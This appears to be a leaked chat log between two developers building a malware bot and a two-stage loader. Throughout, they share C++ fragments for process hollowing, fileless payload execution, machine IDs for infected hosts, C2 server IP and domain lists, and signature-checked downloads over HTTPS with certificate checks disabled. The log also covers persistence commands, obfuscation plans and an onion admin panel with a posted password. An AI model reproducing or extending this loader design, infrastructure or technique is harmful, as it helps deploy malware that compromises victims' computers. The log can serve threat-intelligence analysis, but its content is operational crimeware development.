2020-09-01T11:26:44 price -> mushroom
now no

2020-09-01T11:26:53 mushroom -> price
OK&

2020-09-01T11:27:37 price -> mushroom
besides the error (if you have time) I found an interesting procedure

2020-09-01T11:28:01 price -> mushroom
only works in "isolation" - in a separate function

2020-09-01T11:28:33 price -> mushroom
I use it to get a build

2020-09-01T11:29:02 price -> mushroom
If I put it in the middle of the others, it would not print the right one out of the three numbers.

2020-09-01T11:29:30 price -> mushroom
void getbuildnumber() {
	RTL_OSVERSIONINFOEXW rtovi = { 0 };
	rtovi.dwOSVersionInfoSize = sizeof(rtovi);
	RtlGetVersionPtr(&rtovi);
	ver_build = rtovi.dwBuildNumber;
	debug_printf(TEXT("%d\n"), rtovi.dwBuildNumber);
}

2020-09-01T11:29:34 price -> mushroom
this

2020-09-01T11:30:19 price -> mushroom
separately works correctly

2020-09-01T11:30:34 price -> mushroom
because I'm alone.

2020-09-01T11:31:33 mushroom -> price
I just get the system version by the version of the kernel32.dll file

2020-09-01T11:31:51 price -> mushroom
I want that too!

2020-09-01T11:32:03 price -> mushroom
not to mess with glitchy procedures

2020-09-01T11:32:25 price -> mushroom
but one more thing.

2020-09-01T11:32:39 price -> mushroom
I tried three functions per version and they all give different results

2020-09-01T11:33:07 price -> mushroom
the one I applied-that gives what the cmd prints out

2020-09-01T11:33:43 mushroom -> price
Download: https://qaz.im/load/yZREBK/QKSshh
Delete: https://qaz.im/index.php?a=delete&q=1571380876
Password: V]K';P4D[!]~M1&.s

2020-09-01T11:33:57 mushroom -> price
An example of getting a version.

2020-09-01T11:37:41 price -> mushroom
yes, kernel32.dll has the correct version

2020-09-01T11:38:07 price -> mushroom
I get the same version for the antivirus

2020-09-02T06:24:02 price -> mushroom
Hi

2020-09-02T06:24:36 price -> mushroom
checked runbat dump command 30 cd c:\\r\ndir

2020-09-02T06:25:58 price -> mushroom
Here is the result C:\Users\Admin\source\repos\bd6>cd c:\
c:\>dir
 The volume in the C device is labeled System
 Volume serial number: 5AC9-0087
 The contents of the folder c:\
06.08.2020 01:53 <DIR> !!!!HOF
26.08.2020 16:42 <DIR> !!!!NEWINFO
15.08.2020 22:28 <DIR> !!!BUZA
02.04.2020 18:51 <DIR> !UltraSki
11.07.2020 13:47 <DIR> !VOLA
31.05.2020 17:27 <DIR> $$$Distributives

2020-09-02T06:28:34 price -> mushroom
corrected CreateProcess -> in cmdline instead of cmd.exe tempfilename.bat put just tempfilename.bat

2020-09-02T06:45:33 price -> mushroom
I also tested this command runbat dump 60 d:\r\ncd:d:\r\ndir

2020-09-02T07:09:19 price -> mushroom
Hi

2020-09-02T07:09:19 price -> mushroom
checked the command runbat dump 30 cd c:\\r\ndir

2020-09-02T07:09:19 price -> mushroom
This is the result C:\Users\Admin\source\repos\bd6>cd c:\
c:\>dir
 The volume in the C device is labeled System
 Volume serial number: 5AC9-0087
 The contents of the folder c:\
06.08.2020 01:53 <DIR> !!!!HOF
26.08.2020 16:42 <DIR> !!!!NEWINFO
15.08.2020 22:28 <DIR> !!!BUZA
02.04.2020 18:51 <DIR> !UltraSki
11.07.2020 13:47 <DIR> !VOLA
31.05.2020 17:27 <DIR> $$$Distributives

2020-09-02T07:09:19 price -> mushroom
corrected CreateProcess -> in cmdline instead of cmd.exe tempfilename.bat put just tempfilename.bat

2020-09-02T07:09:19 price -> mushroom
I also tested this command runbat dump 60 d:\r\ncd:d:\r\ndir

2020-09-02T10:31:25 mushroom -> price
Hi. Had a look. The scripts all work as they should. I'm waiting for you to finish it.

2020-09-02T10:31:55 price -> mushroom
Finishing it now

2020-09-02T10:32:28 price -> mushroom
hi

2020-09-02T10:35:45 mushroom -> price
You have x86 and x64 different id for bots, it shouldn't be that way. It should always be the same, on the same computer.

2020-09-02T10:36:14 price -> mushroom
That was a problem for me too. I'll see if I can fix it.

2020-09-02T11:37:54 price -> mushroom
id fixed, earlier the date of creation of system folders included hours minutes and seconds, which for some reason worked differently in x86 and x64. Now the date only includes year, month and day.

2020-09-02T11:39:40 mushroom -> price
I have minutes, seconds, milliseconds and the same id included.

2020-09-02T11:39:50 price -> mushroom
19.03.2019 04:52:46 <--- x86

2020-09-02T11:40:54 price -> mushroom
19.03.2019 04:37:22 <--- x64

2020-09-02T11:41:26 mushroom -> price
What is this date?

2020-09-02T11:41:58 mushroom -> price
For the id I take the creation date of the folder WINDOWS.

2020-09-02T11:42:40 price -> mushroom
this is the second date - there system32 according to the TOR

2020-09-02T11:43:16 price -> mushroom
		if (GetFileAttributesExA(windir, GetFileExInfoStandard, &fileAttr)) {
			ftCreatedDate1 = fileAttr.ftCreationTime;
			FileTimeToSystemTime(&ftCreatedDate1, &cm1);

			PathCombineA(winsys32, windir, "System32");
			GetFileAttributesExA(winsys32, GetFileExInfoStandard, &fileAttr);
			ftCreatedDate2 = fileAttr.ftCreationTime;
			FileTimeToSystemTime(&ftCreatedDate2, &cm2);
		}

2020-09-02T11:43:24 mushroom -> price
I understand why then, for x86 it is SysWOW64\system32

2020-09-02T11:43:29 price -> mushroom
cm1 cm2

2020-09-02T11:43:36 mushroom -> price
And for x64 \system32

2020-09-02T11:43:42 mushroom -> price
Here are the different dates.

2020-09-02T11:43:46 price -> mushroom
duh, that's right.

2020-09-02T11:44:04 mushroom -> price
I only use Windows dates on mine.

2020-09-02T11:44:14 price -> mushroom
what to do? leave only days or leave seconds for windows

2020-09-02T11:44:25 mushroom -> price
And you do as you want, the main thing is that the id was always the same.

2020-09-02T11:44:38 price -> mushroom
now yes

2020-09-02T11:44:57 price -> mushroom
But according to the ToR they are fundamentally different

2020-09-02T11:45:35 mushroom -> price
There in the ToR it's like a recommendation as an id to do.

2020-09-02T11:46:00 price -> mushroom
I see. The uniqueness requirement I saw

2020-09-02T11:54:00 mushroom -> price
I was thinking, better remove this date system32, because if windows at midnight for example, then the day may be different in this date.

2020-09-02T11:55:45 mushroom -> price
Does the connection work?

2020-09-02T11:56:04 price -> mushroom
I was thinking, better remove this date system32, because if windows at midnight for example, then the day may be different in this date.

2020-09-02T11:56:04 price -> mushroom
Does the connection work?

2020-09-09T07:59:28 mushroom -> price
How did you finish the bot?

2020-09-09T08:00:10 price -> mushroom
Was thinking as early as this morning that I'd finished. But now:

2020-09-09T08:00:39 price -> mushroom
1. Can't read the holoving pipes

2020-09-09T08:01:26 price -> mushroom
2. I run my test and see counts in the debug output, but I run your test and it doesn't work. I'm sitting debugging.

2020-09-09T08:02:54 price -> mushroom
I will now cross the holdover example given to me and the one that worked for me on my example

2020-09-09T10:11:39 price -> mushroom
Process* Process::createProcessHollowing(_In_z_ LPSTR cmd,
	_In_reads_bytes_(payloadSize) PBYTE payload, _In_ SIZE_T payloadSize, _In_opt_ PBYTE input,
	_In_opt_ SIZE_T inputSize)

2020-09-09T10:12:00 price -> mushroom
Can you please tell me what is passed into the input?

2020-09-09T10:12:12 price -> mushroom
parameters?

2020-09-09T10:12:44 mushroom -> price
Script for example.

2020-09-09T10:12:52 price -> mushroom
and how pips are included to intercept the input and output inserted into the host payload

2020-09-09T10:12:59 mushroom -> price
For fileless startup

2020-09-09T10:13:23 price -> mushroom
What is the script for the exe?

2020-09-09T10:13:37 mushroom -> price
cmd is cmd.exe and input is cd c:\\r\ndir\r\n for example.

2020-09-09T10:13:38 price -> mushroom
I'm a team of 10

2020-09-09T10:14:08 price -> mushroom
me for the case when an exe module is inserted

2020-09-09T10:14:23 mushroom -> price
input is what you will write in the process stdinput.

2020-09-09T10:15:10 price -> mushroom
and what will be written for TestOutput64.exe

2020-09-09T10:15:18 mushroom -> price
Nothing.

2020-09-09T10:15:42 mushroom -> price
This is just in case you need it.

2020-09-09T10:15:46 price -> mushroom
But there is a code like this

2020-09-09T10:15:47 price -> mushroom
	if (input)
	{
		if (createProcessWritePipe(&stdinRead, &stdinWrite))
			inheritHandles = TRUE;
		else
		{
			process->m_error = GetLastError();
			return process;
		}
	}

2020-09-09T10:15:57 mushroom -> price
Check.

2020-09-09T10:16:14 price -> mushroom
and then where does the piping start for your test module?

2020-09-09T10:16:41 mushroom -> price
Where createProcessReadPipe

2020-09-09T10:16:53 mushroom -> price
To read what the process outputs.

2020-09-09T10:16:56 price -> mushroom
OK, I'm looking at it.

2020-09-09T10:17:10 mushroom -> price
WritePipe to write into the process.

2020-09-09T10:18:29 mushroom -> price
By the way, createProcessHollowing does not read anything.

2020-09-09T10:18:37 mushroom -> price
This is if the process does not time out.

2020-09-09T10:18:49 mushroom -> price
And the one that reads is runProcessHollowing

2020-09-09T10:18:52 price -> mushroom
do you need to run?

2020-09-09T10:19:02 price -> mushroom
guessed it too

2020-09-09T10:19:02 mushroom -> price
If you need to read

2020-09-09T10:19:13 price -> mushroom
I always have to?

2020-09-09T10:19:17 price -> mushroom
or not?

2020-09-09T10:19:23 price -> mushroom
how to understand?

2020-09-09T10:19:25 mushroom -> price
No. If the timeout is 0 you don't have to.

2020-09-09T10:19:31 price -> mushroom
got it

2020-09-09T10:19:37 mushroom -> price
So it's a background process.

2020-09-09T10:19:42 price -> mushroom
It just happened.

2020-09-09T10:20:01 price -> mushroom
I'm going to try it now.

2020-09-09T10:26:35 price -> mushroom
your test program started to run and output in debugview

2020-09-09T10:26:37 price -> mushroom
[2092] Test output
[2092] Test output
[2092] Test output
[2092] Test output
[2092] Test output
[2092] Test output
[2092] Test output
[2092] Test output
[2092] Test output
[2092] Test output
[2092] Test output
[2092] Test output
[2092] Test output
[2092] Test output

2020-09-09T10:27:38 price -> mushroom
nerd=work

2020-09-09T10:27:53 mushroom -> price
It writes both in debug and stdout.

2020-09-09T10:28:56 price -> mushroom
good job program (I have the same, but in my version of the holdover yours did not run), and there you have it.

2020-09-09T10:29:43 price -> mushroom
And for your program to write to the console, you must not write CREATE_NO_WINDOW&

2020-09-09T10:29:50 price -> mushroom
?

2020-09-09T10:30:16 mushroom -> price
If console version.

2020-09-09T10:30:36 price -> mushroom
ok

2020-09-09T10:30:48 mushroom -> price
In the non console version, this flag is ignored.

2020-09-15T10:23:10 mushroom -> price
Hi. Did Booza make you an account?

2020-09-15T10:23:28 price -> mushroom
no information so far

2020-09-15T10:23:37 price -> mushroom
I'm going to ask

2020-09-15T10:24:09 mushroom -> price
I already asked.

2020-09-15T10:24:22 mushroom -> price
Will do now.

2020-09-15T10:24:23 price -> mushroom
and I

2020-09-15T10:24:46 price -> mushroom
[13:24:18] <!
[13:24:31] <PRICE> thank you

2020-09-15T10:27:50 price -> mushroom
[13:25:16] <!MB-Buzz> g:wSVQVdS2?h1D?9|Z
price
https://scrytnuuszglaugg.onion:4247/

2020-09-15T10:29:07 mushroom -> price
Load everything there for the price group the same way.

2020-09-15T10:29:16 price -> mushroom
doing

2020-09-15T11:25:51 price -> mushroom
which IP to request

2020-09-15T11:26:08 price -> mushroom
the name does not resolve the request

2020-09-15T11:26:25 price -> mushroom
HttpSendRequestA

2020-09-15T11:26:30 mushroom -> price
lowers
82.146.37.128
85.143.221.85
195.123.241.194
37.220.6.126
164.132.76.76
164.68.107.165


bot
93.189.46.41
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107

2020-09-15T11:26:47 price -> mushroom
to anyone?

2020-09-15T11:27:39 mushroom -> price
From the list of who you can connect to.

2020-09-15T11:27:54 mushroom -> price
And you have to check the server signature.

2020-09-15T11:28:02 mushroom -> price
It says in the ToR.

2020-09-15T11:28:15 price -> mushroom
read

2020-09-15T11:28:33 price -> mushroom
I don't think there was one last time and we somehow got away with it.

2020-09-15T11:28:54 mushroom -> price
It is written in the ToR for the loader, but it is the same for the loader and for the bot.

2020-09-15T11:29:07 price -> mushroom
ok

2020-09-15T12:46:59 price -> mushroom
Last time the IPs of the bot and the loader had port numbers attached to them. How about this time?

2020-09-15T12:48:00 mushroom -> price
This time the standard ports. 80 for http, 443 for https. You should always use https.

2020-09-17T07:47:30 mushroom -> price
Hi. Addresses:
loaders
82.146.37.128
85.143.221.85
45.148.10.190
86.104.194.77
164.132.76.76
164.68.107.165


bot
51.89.177.8
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107

2020-09-17T07:48:19 price -> mushroom
it's ok, I set up a new server, keep working

2020-09-17T07:48:42 price -> mushroom
The problem was in changing the server to ssl

2020-09-17T07:50:36 mushroom -> price
They send me the addresses and I forward them to you so they're always up to date.

2020-09-17T07:50:52 price -> mushroom
Yeah, got it, thanks.

2020-09-17T07:51:53 price -> mushroom
How do you do it, is it a config file or do you pump it in from a list? Or do you build it in and recompile it (not kosher)

2020-09-17T07:52:30 price -> mushroom
and second, with which key should we validate? is it always the same?

2020-09-17T07:53:21 mushroom -> price
Yes. The one I gave you. Flash it in the program.

2020-09-17T07:53:30 price -> mushroom
ok

2020-09-18T13:49:10 mushroom -> price
Addresses:
lowaders
194.5.249.156
85.143.221.85
45.148.10.190
86.104.194.77
164.132.76.76
164.68.107.165


bot
51.89.177.8
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107

2020-09-18T14:31:13 price -> mushroom
thanks

2020-09-18T14:32:03 price -> mushroom
But here's the question, I have these vector these addresses stitched in. But in reality, how will they be delivered to the bot? I need to recompile now.

2020-09-18T14:36:54 mushroom -> price
Yes.

2020-09-18T14:37:49 price -> mushroom
thanks

2020-09-22T09:42:52 mushroom -> price
Hi, changes in commands, the bot has a command 18, it means to anchor in the system. It turns out the anchoring must be removed from the loader if you made it and transferred to the bot. It turns out so the loader passes the path of its file in the bot. And the bot if it receives the command 18 uses this path to anchor the loader in the system. Bot still can not save to disk.

2020-09-22T09:48:33 mushroom -> price
And then explain how to make there not to use mvcrt and be able to write OOP code or you can not do that without msvcrt?

2020-09-22T10:32:41 price -> mushroom
working on it. Actually the classes are written normally. Crypter, for example, I wrote for validation.

2020-09-22T10:33:14 mushroom -> price
What about virtual methods?

2020-09-22T10:33:21 price -> mushroom
The only question is whether the gitlab server is up and running now or not. I couldn't drop the updates yesterday.

2020-09-22T10:33:46 mushroom -> price
It didn't work for me yesterday either, I'll check now.

2020-09-22T10:33:51 price -> mushroom
haven't tried it. I'll let you know when I try it.

2020-09-22T10:34:44 price -> mushroom
Maybe STL will still work.

2020-09-22T10:35:06 mushroom -> price
Gitlab is not working for me yet either.

2020-09-22T10:35:18 price -> mushroom
this and that

2020-09-22T10:35:45 price -> mushroom
But how do you work with the loader server?

2020-09-22T10:36:02 price -> mushroom
there is only an address but no admin?

2020-09-22T10:36:18 mushroom -> price
Why not?

2020-09-22T10:36:30 price -> mushroom
What's the address?

2020-09-22T10:36:50 price -> mushroom
and the password, I only have one for the bot, I think

2020-09-22T10:37:44 mushroom -> price
You go into the admin panel. Select the tab Groups.

2020-09-22T10:37:51 mushroom -> price
Your price group is there

2020-09-22T10:38:12 price -> mushroom
и

2020-09-22T10:38:17 mushroom -> price
You press the wrench.

2020-09-22T10:38:22 price -> mushroom
got it

2020-09-22T10:38:36 mushroom -> price
Above File destination
Loader x86
	Production execution files

2020-09-22T10:38:42 mushroom -> price
You download the files.

2020-09-22T10:39:11 mushroom -> price
You can see the paths of these files and make queries by these paths.

2020-09-22T10:39:17 mushroom -> price
You have the addresses.

2020-09-22T10:39:47 mushroom -> price
/api197 etc.

2020-09-22T10:40:13 mushroom -> price
The difference is which group will download which file.

2020-09-22T10:40:58 mushroom -> price
And when you load it, you should press the set to production button on the right side of the list.

2020-09-22T10:41:18 price -> mushroom
thanks

2020-09-24T14:27:32 PM mushroom -> price
Hi. How much more to do? What's been done?

2020-09-24T15:10:35 mushroom -> price
Booza said you took some time off. Let me know when you get back.

2020-10-01T06:06:16 mushroom -> price
Hi. How much more to do? What's done?

2020-10-01T06:06:16 mushroom -> price
Booza said you took some time off. When you get back, let me know.

2020-10-01T06:07:14 price -> mushroom
I'm back

2020-10-01T06:08:03 price -> mushroom
During the funeral, there wasn't a chance to do anything. There is now.

2020-10-01T06:09:06 price -> mushroom
I'll make a decision today and let you know tomorrow.

2020-10-01T07:08:38 price -> mushroom
I'm back

2020-10-01T07:08:38 price -> mushroom
During the funeral, there was no opportunity to do anything. There is now.

2020-10-01T07:08:38 price -> mushroom
I will decide today and let you know tomorrow.

2020-10-01T07:49:31 mushroom -> price
Okay.

2020-10-05T08:39:23 mushroom -> price
Hi. What has been done so far?

2020-10-05T09:42:09 price -> mushroom
Hi

2020-10-05T09:43:12 price -> mushroom
I read the ToR (continuously), but I can't figure out where to unload the loader and then apparently the bot.

2020-10-05T09:44:57 price -> mushroom
The problem with understanding the two parts of the loader. The first one, which defines the bit rate and loads the second one with the corresponding bit rate.

2020-10-05T10:02:37 mushroom -> price
Determines the digit capacity of the system. Just like it is defined in the bot for command 1.

2020-10-05T10:03:24 price -> mushroom
I decided to spit and rewrite the code from the bot.

2020-10-05T10:03:46 price -> mushroom
But the link to the lowader is still not clear.

2020-10-05T10:03:55 mushroom -> price
And in general you don't have to do that yet, we don't use x86 versions at all.

2020-10-05T10:04:05 mushroom -> price
Don't do that.

2020-10-05T10:04:57 mushroom -> price
Just use a macro to make _WIN64, _WIN32. And based on that, download the desired bot.

2020-10-05T10:05:02 price -> mushroom
So I start ld6. What address to look for the bot to start. Or do I have to download the second part of the loeder from the server?

2020-10-05T10:06:07 mushroom -> price
The Groups says.

2020-10-05T10:06:27 price -> mushroom
In the admin area?

2020-10-05T10:06:39 mushroom -> price
Loader x86, Loader x64, Bot x86, Bot x64

2020-10-05T10:06:42 mushroom -> price
Yes.

2020-10-05T10:07:18 price -> mushroom
I'll connect to the server and let you know.

2020-10-05T10:07:51 mushroom -> price
And they have /api/v89 - Loader x86, /api/v90 - Loader x64, /api/v91 - Bot x86, /api/v92 - Bot x64

2020-10-05T10:08:05 mushroom -> price
For example. And you will have other ways.

2020-10-05T10:08:22 price -> mushroom
are they visible from the admin area?

2020-10-05T10:08:45 mushroom -> price
Your group has paths /api/v197, /api/v198, /api/v199, /api/v200

2020-10-05T10:09:03 mushroom -> price
They are, I'm in your price group right now looking at them.

2020-10-05T10:09:14 price -> mushroom
have the servers changed lately?

2020-10-05T10:09:41 mushroom -> price
No. Maybe some don't work.

2020-10-05T10:11:11 mushroom -> price
If the address does not work, you will notice immediately the error wininet 12009 most likely. So go through the list of addresses, until you can not download.

2020-10-05T10:11:22 PM mushroom -> price
If all don't work tell me.

2020-10-05T10:11:30 price -> mushroom
ok

2020-10-06T09:10:56 mushroom -> price
Hi. How's the promotion going?

2020-10-06T09:11:25 mushroom -> price
For the loader, also make a project on GitLab called dl6.

2020-10-06T09:11:31 mushroom -> price
If you haven't already.

2020-10-06T09:11:50 price -> mushroom
I'm trying to contact the server, but so far I'm getting nothing.

2020-10-06T09:12:07 price -> mushroom
I will post it as soon as I get an answer

2020-10-06T09:12:21 price -> mushroom
went to vadmin and realized file placement

2020-10-06T09:12:34 price -> mushroom
are cookies also valid for the loader?

2020-10-06T09:13:11 price -> mushroom
Are the addresses still the same?

2020-10-06T09:13:11 price -> mushroom
		const CHAR* LoaderServers[] = {
			"194.5.249.156",
			"85.143.221.85",
			"45.148.10.190",
			"86.104.194.77",
			"164.132.76.76",
			"164.68.107.165"
		};

2020-10-06T09:13:49 mushroom -> price
bot

54.236.253.121 z55gc.com
54.201.135.91 z56gc.com

Lowder


34.230.74.154 z57gc.com
3.135.193.147 z58gc.com
54.190.173.144 z59gc.com

2020-10-06T09:14:00 mushroom -> price
Here, it's definitely working.

2020-10-06T09:14:19 mushroom -> price
You don't have the file loaded in the admin.

2020-10-06T09:14:46 price -> mushroom
So I'm still on validation

2020-10-06T09:14:47 price -> mushroom
		ibotidlen = wnsprintfA(sreq, sizeof(sreq), "/%s/2", hexHashID);
		for (int i = 0; i < sizeof(LoaderServers) / sizeof(CHAR*); ++i) {
			//debug_printfA("%s\n", BotServers[i];
			hConnect = InternetConnectA(hInternet, LoaderServers[i], serverPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL/*1u*/);
			if (hConnect) {

				hRequest = HttpOpenRequestA(hConnect, "GET", sreq, NULL, NULL, 0, fflags, 0);//INTERNET_FLAG_SECURE|

2020-10-06T09:14:59 price -> mushroom
not like with the bot?

2020-10-06T09:15:29 price -> mushroom
I guess neither hash nor get works, but what does?

2020-10-06T09:16:24 mushroom -> price
The loader does not need any id/2 at all

2020-10-06T09:16:32 mushroom -> price
There are just dumb queries

2020-10-06T09:16:48 mushroom -> price
The first request HEAD to the address as listed there

2020-10-06T09:16:51 price -> mushroom
intuitively understandable, but what are the dumb queries

2020-10-06T09:17:06 mushroom -> price
You get the headers with the date and SID=

2020-10-06T09:17:15 mushroom -> price
SID is a signature

2020-10-06T09:17:22 price -> mushroom
Okay, let me think about it for another hour.

2020-10-06T09:17:46 mushroom -> price
You use it to check the date string (without time).

2020-10-06T09:17:56 price -> mushroom
but you have to query the storage directories of bots and loaders?

2020-10-06T09:18:17 price -> mushroom
Do you have to put something in there?

2020-10-06T09:19:43 mushroom -> price
Yes. You have to put the files there to check the work and specify the versions for them.

2020-10-06T09:20:23 mushroom -> price
After checking the signature again HEAD request with header Update:/api/v89 for example.

2020-10-06T09:20:39 mushroom -> price
You get X-Tag:0.1 in the response header

2020-10-06T09:20:46 mushroom -> price
For example.

2020-10-06T09:21:08 price -> mushroom
directly in the admin panel to put the 0.1 version?

2020-10-06T09:21:59 mushroom -> price
Compare 0.1 with firmware version in loader. Does not match GET request there, download the file, run it, exit. It turns out another downloader will download.

2020-10-06T09:23:30 mushroom -> price
Yes, put the version right there. Version is an arbitrary string. On this you have for example in the program you firmware 0.5 and there will be 0.1 it is believed that you have to download what's there and run. Check that more is not necessary, just do not equal and all.

2020-10-06T09:24:28 mushroom -> price
If the version strings match, make a GET request for the bot at the address as in the admin panel, download, run without saving to disk, exit.

2020-10-06T09:24:40 mushroom -> price
There is no need to do any locking in the loader.

2020-10-06T09:25:35 price -> mushroom
And how will the new version number be stamped in the admin area after the fact of version mismatch and downloading the new version?

2020-10-06T09:26:01 mushroom -> price
On requests also
if (isSecure)
        {
            DWORD flags = 0;
            DWORD flagsSize = sizeof(flags);
            if (wininet.internetQueryOption(m_req, INTERNET_OPTION_SECURITY_FLAGS, &flags,
                &flagsSize))
            {
                flags |= SECURITY_FLAG_IGNORE_REVOCATION;
                flags |= SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
                flags |= SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
                flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTP;
                flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTPS;
                flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
#ifndef __MINGW32__
                flags |= SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;
#endif // !__MINGW32__
                flags |= SECURITY_FLAG_IGNORE_WRONG_USAGE;
                wininet.internetSetOption(m_req, INTERNET_OPTION_SECURITY_FLAGS, &flags,
                    flagsSize);
            }
        }

2020-10-06T09:26:22 mushroom -> price
No way.

2020-10-06T09:26:45 price -> mushroom
how do the versions move?

2020-10-06T09:26:51 mushroom -> price
It is believed that if the versions do not match, download what is there and run it.

2020-10-06T09:27:14 price -> mushroom
So someone in the admin office will change the number manually?

2020-10-06T09:27:19 mushroom -> price
Make a new build yourself, flash the version there and write it in the admin.

2020-10-06T09:27:26 mushroom -> price
Yes, by hand.

2020-10-06T09:27:33 price -> mushroom
Now it all makes sense!

2020-10-06T09:28:03 mushroom -> price
Each new build increases the number.

2020-10-06T10:21:01 price -> mushroom
Set-Cookie: SID=5t5mC1xtQ1yLLP%2F5EqUhJmcxGlqbl4kzGDpspkxYNRovPdE%2Frq2Up20DVVgK9uf6tPxOoH211jENUb0y54eRfCcOHaNLH8tmSuhSg%2B9SA6Ybw2Z8%2FgUjuqfxNjfkI3OL

2020-10-06T10:21:08 price -> mushroom
here you have it

2020-10-06T10:21:18 price -> mushroom
verifying now

2020-10-06T10:22:35 mushroom -> price
Replace url encoded characters first:
//Replace %2B -> +
        PTSTR urlCh = StrStr(base64Sign, _TSTR(TEXT("%2B")))
        while (urlCh)
        {
            *urlCh = TEXT('+');
            MoveMemory(urlCh + 1, urlCh + 3, (base64SignSize - (urlCh + 3 - base64Sign));

            base64SignSize -= 2;
            base64Sign[base64SignSize] = TEXT('\0');
            urlCh = StrStr(base64Sign, _TSTR(TEXT("%2B"))
        }

        //Replace %2F -> /
        urlCh = StrStr(base64Sign, _TSTR(TEXT("%2F")))
        while (urlCh)
        {
            *urlCh = TEXT('/');
            MoveMemory(urlCh + 1, urlCh + 3, (base64SignSize - (urlCh + 3 - base64Sign));

            base64SignSize -= 2;
            base64Sign[base64SignSize] = TEXT('\0');
            urlCh = StrStr(base64Sign, _TSTR(TEXT("%2F"))
        }

        //Replace %3D -> =
        urlCh = StrStr(base64Sign, _TSTR(TEXT("%3D")))
        while (urlCh)
        {
            *urlCh = TEXT('=');
            MoveMemory(urlCh + 1, urlCh + 3, (base64SignSize - (urlCh + 3 - base64Sign));

            base64SignSize -= 2;
            base64Sign[base64SignSize] = TEXT('\0');
            urlCh = StrStr(base64Sign, _TSTR(TEXT("%3D"))
        }

2020-10-06T10:23:04 price -> mushroom
I'll do that, I already did it for the bot

2020-10-06T10:23:21 mushroom -> price
%2B -> +
%2F -> /
%3D -> =

2020-10-06T10:23:51 price -> mushroom
you would have told me before I obtained this knowledge myself

2020-10-06T10:25:30 mushroom -> price
What do you need to change the characters? I thought I said.

2020-10-06T10:30:40 price -> mushroom
So I didn't notice, but I remember catching up on that

2020-10-06T15:07:43 price -> mushroom
hi

2020-10-06T15:07:55 price -> mushroom
Here's an example, you asked me once

2020-10-06T15:07:57 price -> mushroom

class Parent
{
public:
	virtual const char* getName() { return "Parent"; }
};

class Child : public Parent
{
public:
	virtual const char* getName() { return "Child"; }
};

void ld6(void) {
	printf("Hello World!\n");
	ExitProcess(0);
}
int main(int argc,char**argv) {
	Child child;
	Parent& rParent = child;
	printf("rParent is a %s\n", rParent.getName());

2020-10-06T15:08:17 price -> mushroom
and this one in the output

2020-10-06T15:08:18 price -> mushroom
rParent is a Child

2020-10-07T08:12:19 mushroom -> price
Hi. How's the progress? I see in the admin panel you don't have a single file uploaded.

2020-10-07T08:12:51 price -> mushroom
hi

2020-10-07T08:13:29 price -> mushroom
no files, because I'm still deciding in principle

2020-10-07T08:17:01 mushroom -> price
How much more time do you need?

2020-10-07T08:17:12 price -> mushroom
two days

2020-10-07T08:18:43 mushroom -> price
All upload to gitlab then, as you decide. So you can just open the solution and bot and loader select to build about check. Now again the bot is not assembling in a simple Release configuration.

2020-10-07T08:19:16 price -> mushroom
I will comprehensively prepare.

2020-10-07T08:19:36 mushroom -> price
Then you have to obfuscate everything.

2020-10-07T08:19:49 price -> mushroom
The homemade CRT library has changed, I'm already doing the loader on the new one.

2020-10-07T08:20:15 price -> mushroom
while I assemble the loader just a functional

2020-10-07T08:20:43 price -> mushroom
Did you read about the virtual functions? I didn't think it would work. But it worked.

2020-10-07T08:21:12 mushroom -> price
Read.

2020-10-07T08:21:16 price -> mushroom
Do you have an example of obfuscation?

2020-10-07T08:21:23 mushroom -> price
Check.

2020-10-07T08:21:33 price -> mushroom
in documents?

2020-10-07T08:21:44 mushroom -> price
Make it work first.

2020-10-07T08:21:55 price -> mushroom
I do.

2020-10-07T08:22:08 price -> mushroom
Got to the verification yesterday.

2020-10-07T08:22:17 price -> mushroom
left to download.

2020-10-07T08:22:30 price -> mushroom
the same theme as in the bot download by link?

2020-10-07T08:22:59 price -> mushroom
By the way, I downloaded the bot and the loader, but just the left ones to pump out

2020-10-07T08:23:20 price -> mushroom
should be in the admin panel!

2020-10-07T08:23:24 price -> mushroom
 I'll take a look now.

2020-10-07T08:23:41 mushroom -> price
https://scrytnuuszglaugg.onion:4247/groups/loadertool?id=50

2020-10-07T08:23:55 mushroom -> price
There's nothing there.

2020-10-07T08:24:09 mushroom -> price
Production execution files

2020-10-07T08:24:24 mushroom -> price
Load there, and then press GO.

2020-10-07T08:26:26 price -> mushroom
GO didn't click!!!

2020-10-08T13:46:34 mushroom -> price
How's it going?

2020-10-08T13:46:54 price -> mushroom
Finishing up

2020-10-08T13:46:57 price -> mushroom
goes

2020-10-08T13:47:06 price -> mushroom
no questions except time

2020-10-08T13:47:38 mushroom -> price
Did you load what into the group?

2020-10-08T13:48:03 price -> mushroom
Not yet, everything is in the making

2020-10-08T13:48:05 price -> mushroom
By the way

2020-10-08T13:48:18 price -> mushroom
I'll upload the bot and the loafer there

2020-10-08T13:48:25 price -> mushroom
but how to check

2020-10-08T13:48:39 mushroom -> price
Run your looder.

2020-10-08T13:49:02 price -> mushroom
here's the loader I run in the VM, bypass the locale and download the bot and run it holoving

2020-10-08T13:49:06 price -> mushroom
it's clear

2020-10-08T13:49:16 price -> mushroom
But what to do with the downloaded ones

2020-10-08T13:49:31 price -> mushroom
I downloaded the bot - can I download it?

2020-10-08T13:49:45 price -> mushroom
and a lowader to check for new versions?

2020-10-08T13:50:27 price -> mushroom
That is, the bot in the group on the server to download it?

2020-10-08T13:50:36 mushroom -> price
On the server, change the version in the Version field

2020-10-08T13:50:40 price -> mushroom
and a lowader to download updates?

2020-10-08T13:50:57 mushroom -> price
And you'll get it.

2020-10-08T13:51:06 price -> mushroom
and if the version is different, you have to download?

2020-10-08T13:51:10 mushroom -> price
And compare with the one in the program.

2020-10-08T13:51:12 price -> mushroom
Now it's clearer.

2020-10-08T13:51:18 mushroom -> price
Yes, you have to download and run it.

2020-10-08T13:51:58 price -> mushroom
I've tried all the options, I'm working on the code now, I'll post it soon

2020-10-08T13:52:33 price -> mushroom
But what is a tapping? There is 5 minutes in the TOR, how is it done and where to look?

2020-10-08T13:52:36 mushroom -> price
As you start a new one, delete the old one.

2020-10-08T13:53:04 price -> mushroom
